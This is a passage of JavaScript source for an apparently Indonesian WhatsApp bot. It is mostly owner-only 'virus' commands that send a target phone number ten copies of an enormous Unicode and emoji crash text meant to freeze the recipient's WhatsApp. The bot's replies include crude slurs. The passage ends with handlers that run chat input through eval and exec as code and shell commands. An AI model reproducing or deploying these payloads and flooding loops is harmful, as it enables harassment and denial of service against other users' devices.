     *99999* *ดฝทฟดฟ* *99999* *ดฝทฟดฟ*
     
     *99999* *ดฝทฟดฟ* *99999* *ดฝทฟดฟ*
   
     *๒๒๒๒ ๑๑๑๑ ๒๒๒๒*
     *๑๑๑๑ ๒๒๒๒ ๑๑๑๑*
     
     *๒๒๒๒ ๑๑๑๑ ๒๒๒๒*
     *๑๑๑๑ ๒๒๒๒ ๑๑๑๑*
     *๒๒๒๒ ๑๑๑๑ ๒๒๒๒*
     *๑๑๑๑ ๒๒๒๒ ๑๑๑๑*
     *๒๒๒๒ ๑๑๑๑ ๒๒๒๒*
     *๑๑๑๑ ๒๒๒๒ ๑๑๑๑*
     *E漢.G.U.H.漢.漢S.E.G.UE.漢.漢.O.漢.漢.B.A.I.L.E漢.G.U.H.漢.漢S.E.G.UE.漢.漢.O.漢.漢.B.A.I.L.E漢.G.U.H.漢.漢S.E.G.UE.漢.漢.O.漢.漢.B.A.I.L.E2018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018201820182018
        —————————————————————————————————————
      `
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `4s`
for (let i = 0; i < jumlah; i++) {
crazy.sendMessage(num, {
text: txtvir }, { quoted: lep } 
)}
await sleep(ms(waktu))
    }
      break
      case 'wolfvirus': 
{  if (!itsMecrazy) return m.reply(`sorry anda sepertinya bukan pemilik bot`)           
        txts = `Succes ✅ "TUNGGU 2 MENIT YA KONTOL UNTUK KIRIM SANTET LAGI" <== DIBACA!!!`
        m.reply(txts)
        txtvir = ` 
        ☆☆WE ARE WOLF SCURITY CYBER☆☆
        -----------./Tuan M4X1----------
        | ~~Lanjut Attack Sebelum Down~~ |
        | ~~Lanjut Attack Sebelum Down~~ |
        --------Wolf-Scurity-Cyber------
        ☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢ ☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢ ☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢ ☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢☢☪☣~~🐺 *W^S^C* 🐺~~☣☪☢
        
        
      `
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `4s`
for (let i = 0; i < jumlah; i++) {
crazy.sendMessage(num, {
text: txtvir }, { quoted: lep } 
)}
await sleep(ms(waktu))
    }
      break
      case 'gustavvirus': 
{  if (!itsMecrazy) return m.reply(`sorry anda sepertinya bukan pemilik bot`)           
        txts = `Succes ✅ "TUNGGU 2 MENIT YA KONTOL UNTUK KIRIM SANTET LAGI" <== DIBACA!!!`
        m.reply(txts)
        txtvir = ` ♟̙̤️͕̩͙͓c̪͉͎̮̦̟͎͎͎ͅh̹̠̯̹̯̠̞̞͍̜ḛ͔̱̥̯c̥̩̜̲̘k͙̬͉͚̤̝̩ͅ ͚̖̠m̮͓̠a͕̭̱̺̹t͕̖͔̠̥̲̠e̼̫̮̹̹̰͕̦̥ ͓̘̠̝♟̞̙̲̱̦͚̮️̜̫by:gustavo🔥
        �.🥳    ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ 🥳�
      `
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `4s`
for (let i = 0; i < jumlah; i++) {
crazy.sendMessage(num, {
text: txtvir }, { quoted: lep } 
)}
await sleep(ms(waktu))
    }
      break
      case 'damnikavirus': 
{  if (!itsMecrazy) return m.reply(`sorry anda sepertinya bukan pemilik bot`)           
        txts = `Succes ✅ "TUNGGU 2 MENIT YA KONTOL UNTUK KIRIM SANTET LAGI" <== DIBACA!!!`
        m.reply(txts)
        txtvir = ` Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.؋.Đ.Δ.Μ.Ň.į.Ҝ.Δ.ᇸ.؋.ᄻ.ྜྷ.ᇸ.ྙ.ﻜ.ᇶ.ྒྷ.ﻷ.ᆆ.ྜྷ.ᅒ.ྔ.ᇶ.ྒྷ.ྖ.ᆟ.https://chat.whatsapp.com/JcRJzXXqDzH5Aw7GTKIMCh
      `
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `4s`
for (let i = 0; i < jumlah; i++) {
crazy.sendMessage(num, {
text: txtvir }, { quoted: lep } 
)}
await sleep(ms(waktu))
    }
      break
default:
}
if (budy.startsWith('=>')) {
if (!itsMecrazy) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMecrazy) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMecrazy) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMecrazy) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}
} catch (err) {
m.reply(util.format(err))
}
} 